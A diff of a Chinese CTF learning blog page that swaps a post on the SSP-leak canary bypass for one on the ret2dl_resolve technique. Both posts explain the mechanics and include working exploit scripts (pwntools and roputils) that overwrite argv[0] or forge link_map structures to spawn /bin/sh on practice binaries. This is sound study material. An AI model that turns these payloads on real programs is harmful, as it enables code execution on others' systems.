@@ -86,20 +86,17 @@
 
 
 
-<meta name="description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
-<meta property="og:type" content="website">
-<meta property="og:title" content="对于canary的ssp leak打法的学习（好像又名Stack smash）">
-<meta property="og:url" content="http://yoursite.com/对于canary的ssp leak打法的学习（好像又名Stack smash）.html">
+<meta name="description" content="关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。 等什么时候真正看懂了，再补上吧。 网络上前辈的教程：  http://rk700.github.io/2015/08/09/return-to-dl-resolve/http://angelboy.logdown.com/posts/283218-return-to-dl-resolvehttp://pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对于ret2dl_resolve的探究">
+<meta property="og:url" content="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
+<meta property="og:description" content="关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。 等什么时候真正看懂了，再补上吧。 网络上前辈的教程：  http://rk700.github.io/2015/08/09/return-to-dl-resolve/http://angelboy.logdown.com/posts/283218-return-to-dl-resolvehttp://pwn">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/D:%5Cblog%5CHexo%5Csource%5Cimages%5Ccanary_a768142147ca3976598941b5c6c67161.png">
-<meta property="og:image" content="http://yoursite.com/D:%5Cblog%5CHexo%5Csource%5Cimages%5CQQ%E5%9B%BE%E7%89%8720191023235955.png">
-<meta property="og:updated_time" content="2019-10-23T16:07:36.139Z">
+<meta property="og:updated_time" content="2019-10-29T09:20:26.592Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="对于canary的ssp leak打法的学习（好像又名Stack smash）">
-<meta name="twitter:description" content="这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。其实就是菜，自己讲不出个所以然  除了通过各种方法泄露canary之外，我们还有一个可选项——利用__stack_chk_fail函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做SSP(Stack Smas">
-<meta name="twitter:image" content="http://yoursite.com/D:%5Cblog%5CHexo%5Csource%5Cimages%5Ccanary_a768142147ca3976598941b5c6c67161.png">
+<meta name="twitter:title" content="对于ret2dl_resolve的探究">
+<meta name="twitter:description" content="关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。 等什么时候真正看懂了，再补上吧。 网络上前辈的教程：  http://rk700.github.io/2015/08/09/return-to-dl-resolve/http://angelboy.logdown.com/posts/283218-return-to-dl-resolvehttp://pwn">
 
 
 
@@ -129,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/对于canary的ssp leak打法的学习（好像又名Stack smash）.html">
+  <link rel="canonical" href="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/">
 
 
 
 
 
-  <title>对于canary的ssp leak打法的学习（好像又名Stack smash） | zhz'blog</title>
+  <title>对于ret2dl_resolve的探究 | zhz'blog</title>
   
 
 
@@ -284,52 +281,255 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zhz">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zhz.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhz'blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">对于canary的ssp leak打法的学习（好像又名Stack smash）</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <p>这里恬不知耻的先粘贴一大段i春秋关于ssp leak打法的讲解。<del>其实就是菜，自己讲不出个所以然</del></p>
-<p> 除了通过各种方法泄露canary之外，我们还有一个可选项——利用<code>__stack_chk_fail</code>函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做<code>SSP(Stack Smashing Protect) Leak</code>.<br>在开始之前，我们先来回顾一下canary起作用到程序退出的流程。首先，canary被检测到修改，函数不会经过正常的流程结束栈帧并继续执行接下来的代码，而是跳转到<code>call __stack_chk_fail</code>处，然后对于我们来说，执行完这个函数，程序退出，屏幕上留下一行<br><code>*** stack smashing detected ***:[XXX] terminated</code>。这里的[XXX]是程序的名字。很显然，这行字不可能凭空产生，肯定是<code>__stack_chk_fail</code>打印出来的。而且，程序的名字一定是个来自外部的变量（毕竟ELF格式里面可没有保存程序名）。既然是个来自外部的变量，就有修改的余地。我们看一下<code>__stack_chk_fail</code>的源码，会发现其实现如下： </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>) </span><br><span class="line">&#123;  </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span> </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)   </span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,             </span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 我们看到<code>__libc_message</code>一行输出了<code>*** %s ***: %s terminated\n</code>。这里的参数分别是msg和<code>__libc_argv[0]</code>。<code>char *argv[]</code>是main函数的参数，<code>argv[0]</code>存储的就是程序名，且这个argv[0]就存在于栈上。</p>
-<p>这里贴一个vidar的 Veritas501 师傅的讲解</p>
-<p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风 </p>
-<p><img src="//yoursite.com/D:%5Cblog%5CHexo%5Csource%5Cimages%5Ccanary_a768142147ca3976598941b5c6c67161.png" alt="canary_a768142147ca3976598941b5c6c67161"></p>
-<p>所以SSP leak的玩法就是通过修改栈上的argv[0]指针，从而让<code>__stack_chk_fail</code>被触发后输出我们想要知道的东西。 </p>
-<p>所以……  这位vidar的pwn王意思就是，管他三七二十一，暴力覆盖就是了，别管多长，只要你要的数据的地址你能拿到，覆盖！</p>
-<p>这里放一个例题，三叶草的纳新题，canary2</p>
-<p><img src="//yoursite.com/D:%5Cblog%5CHexo%5Csource%5Cimages%5CQQ%E5%9B%BE%E7%89%8720191023235955.png" alt="QQ图片20191023235955"></p>
-<p>一看，无法泄露，也不能爆破，那自然就想到ssp leak打法</p>
-<p>flag的地址在buf里面，你又能通过printf  get  buf地址。 那剩下的就只有暴力覆盖了</p>
-<p>这里贴上exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./canary2'</span>)</span><br><span class="line"><span class="comment">#sh = remote('pwnto.fun',10007)</span></span><br><span class="line">sh.recvuntil(<span class="string">'key: '</span>)</span><br><span class="line">key = sh.recv(<span class="number">9</span>)</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = key[<span class="number">2</span>:]</span><br><span class="line">log.success(<span class="string">"the key="</span>+ key)</span><br><span class="line">key = int(key,<span class="number">16</span>)</span><br><span class="line">payload = p64(key)*<span class="number">200</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline()</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>
-
-<p>​        对了，这里记录一点我个人的小问题，recv接收后的key是字符串类型，所以不进行p64(key)直接发过去的是ascll，不是我们想要的指针类型。</p>
-<p>​        寻思着，那打包一下就可以了吧。发现p64(key)失败，探究了一下，发现是字符串型转字符串型失败。又想着key = int(key)，也不成功。那是因为，int()是有两个参数的，我以前一直以为直接int(x)就好了。2333333333</p>
-
+          <h1 class="post-title" itemprop="name headline">对于ret2dl_resolve的探究</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-28T23:32:04+08:00">
+                2019-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <p>关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。</p>
+<p>等什么时候真正看懂了，再补上吧。</p>
+<p>网络上前辈的教程：</p>
+<blockquote>
+<p><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="https://github.com/inaz2/roputils/blob/master/roputils.py" target="_blank" rel="noopener">https://github.com/inaz2/roputils/blob/master/roputils.py</a></p>
+</blockquote>
+<p>具体的，前辈们已经介绍的很详细了，在这里，我只是赘述自己学到的，整理一下自己能简单理解的东西</p>
+<h1 id="ret2dl-resolve的核心原理"><a href="#ret2dl-resolve的核心原理" class="headerlink" title="ret2dl_resolve的核心原理"></a>ret2dl_resolve的核心原理</h1><p> ret2dl-resolve的核心原理是攻击符号重定位流程，使其解析库中存在的任意函数地址，从而实现got表的劫持。 </p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="为什么要设置延迟绑定"><a href="#为什么要设置延迟绑定" class="headerlink" title="为什么要设置延迟绑定"></a>为什么要设置延迟绑定</h2><p>​        要想回答这个问题，首先我们得从动态链接说起。为了减少存储器浪费，现代操作系统支持动态链接特性。即不是在程序编译的时候就把外部的库函数编译进去，而是在运行时再把包含有对应函数的库加载到内存里。由于内存空间有限，选用函数库的组合无限，显然程序不可能在运行之前就知道自己用到的函数会在哪个地址上。</p>
+<p>​        比如说对于libc.so来说，我们要求把它加载到地址0x1000处，A程序只引用了libc.so，从理论上来说这个要求不难办到。但是对于用了liba,so, libb.so, libc.so……liby.so, libz.so的B程序来说，0x1000这个地址可能就被liba.so等库占据了。因此，程序在运行时碰到了外部符号，就需要去找到它们真正的内存地址，这个过程被称为重定位。</p>
+<p>​        为了安全，现代操作系统的设计要求代码所在的内存必须是不可修改的，那么诸如call read一类的指令即没办法在编译阶段直接指向read函数所在地址，又没办法在运行时修改成read函数所在地址，怎么保证CPU在运行到这行指令时能正确跳到read函数呢？这就需要got表（Global Offset Table，全局偏移表）和plt表（Procedure Linkage Table，过程链接表）进行辅助了。 </p>
+<p>​         在延迟加载的情况下，每个外部函数的got表都会被初始化成plt表中对应项的地址。当call指令执行时，EIP直接跳转到plt表的一个jmp，这个jmp直接指向对应的got表地址，从这个地址取值。此时这个jmp会跳到保存好的，plt表中对应项的地址，在这里把每个函数重定位过程中唯一的不同点，即一个数字入栈（本例子中write是18h,read是0，对于单个程序来说，这个数字是不变的），然后push got[1]并跳转到got[2]保存的地址。在这个地址中对函数进行了重定位，并且修改got表为真正的函数地址。当第二次调用同一个函数的时候，call仍然使EIP跳转到plt表的同一个jmp，不同的是这回从got表取值取到的是真正的地址，从而避免重复进行重定位。 </p>
+<p>进行跟进分析后，发现，主要影响重定位的，是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">           ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">           struct link_map *__unbounded l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
+
+<p>中的reloc_arg， 我们主要控制reloc_arg进行攻击。</p>
+<h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read 0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure>
+
+<p>在第一次调用时，<code>jmp read@got.plt</code>会跳回<code>read@plt</code>，这是我们已经知道的。接下来，会将参数push到栈上并跳至<code>.got.plt+0x8</code>，这相当于调用以下函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset);</span><br></pre></td></tr></table></figure>
+
+<p>​        </p>
+<p>​        这就是重定位符号表，因为第一次调用函数的时候，并不是直接跳转到libc空间中的函数，而是在这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会通过两次push，最后跳到libc的_dl_runtime_resolve去执行。_dl_runtime_resolve的目的，是根据push 的两个参数导出函数的地址，然后放到相应的GOT表，并且调用它。 </p>
+<p>那么，我们的思路是在内存中伪造Elf32_Rel和Elf32_Sym两个结构体，并手动传递reloc_arg使其指向我们伪造的结构体，让Elf32_Sym.st_name的偏移值指向预先放在内存中的字符串system完成攻击。 </p>
+<h1 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h1><p>​        方法变成了覆盖 (link_map + 0x1c8) 处为 NULL, 也就是<code>if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code>这一句.<br>​        但是link_map是在ld.so上的,因此我们需要leak,若程序没有输出函数,则无法使用这个方法. </p>
+<h1 id="使用ROPutils简化攻击步骤"><a href="#使用ROPutils简化攻击步骤" class="headerlink" title="使用ROPutils简化攻击步骤"></a>使用ROPutils简化攻击步骤</h1><p>使用通常的构造payload过程繁琐，虽然格式化，但是还是不利于我们编写。故此，我们使用roputils.py这个模块进行ret2_dl_resolve攻击</p>
+<p>以 XMAN 2016-level3/level4 为例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROP</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./level4'</span>)                        <span class="comment">#ROP继承了ELF类，下面的section, got, plt都是调用父类的方法</span></span><br><span class="line">bss_addr = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">read_got = rop.got(<span class="string">'read'</span>)</span><br><span class="line">read_plt = rop.plt(<span class="string">'read'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">io = Proc(host = <span class="string">'172.17.0.2'</span>, port = <span class="number">10001</span>)        <span class="comment">#roputils中这里需要显式指定参数名</span></span><br><span class="line"></span><br><span class="line">buf = rop.fill(offset)                        <span class="comment">#fill用于生成填充数据</span></span><br><span class="line">buf += rop.call(read_plt, <span class="number">0</span>, bss_addr, <span class="number">0x100</span>)        <span class="comment">#call可以通过某个函数的plt地址方便地进行调用</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_addr+<span class="number">0x20</span>, bss_addr)        <span class="comment">#dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数的参数。这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处</span></span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br><span class="line"></span><br><span class="line">然后我们直接用dl_resolve_data生成伪造的link_map并发送</span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)                </span><br><span class="line">buf += rop.fill(<span class="number">0x20</span>, buf)                <span class="comment">#如果fill的第二个参数被指定，相当于将第二个参数命名的字符串填充至指定长度</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_addr+<span class="number">0x20</span>, <span class="string">'system'</span>)        <span class="comment">#dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名</span></span><br><span class="line">buf += rop.fill(<span class="number">0x100</span>, buf)</span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br></pre></td></tr></table></figure>
       
     </div>
     
     
     
+<div>
+    
+      
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2019/10/28/对于ret2-resolve的探究/">对于ret2dl_resolve的探究</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 zhz 的个人博客">zhz</a></p>
+  <p><span>发布时间:</span>2019年10月28日 - 23:10</p>
+  <p><span>最后更新:</span>2019年10月29日 - 17:10</p>
+  <p><span>原始链接:</span><a href="/2019/10/28/对于ret2-resolve的探究/" title="对于ret2dl_resolve的探究">http://yoursite.com/2019/10/28/对于ret2-resolve的探究/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+    
+  </div>
+   
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    zhz
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/" title="对于ret2dl_resolve的探究">http://yoursite.com/2019/10/28/对于ret2-resolve的探究/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" rel="next" title="对于canary的ssp leak打法的学习（好像又名Stack smash）">
+                <i class="fa fa-chevron-left"></i> 对于canary的ssp leak打法的学习（好像又名Stack smash）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -362,8 +562,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -380,7 +589,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -407,6 +616,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dl-resolve的核心原理"><span class="nav-number">1.</span> <span class="nav-text">ret2dl_resolve的核心原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么要设置延迟绑定"><span class="nav-number">2.1.</span> <span class="nav-text">为什么要设置延迟绑定</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x86"><span class="nav-number">3.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x64"><span class="nav-number">4.</span> <span class="nav-text">x64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用ROPutils简化攻击步骤"><span class="nav-number">5.</span> <span class="nav-text">使用ROPutils简化攻击步骤</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
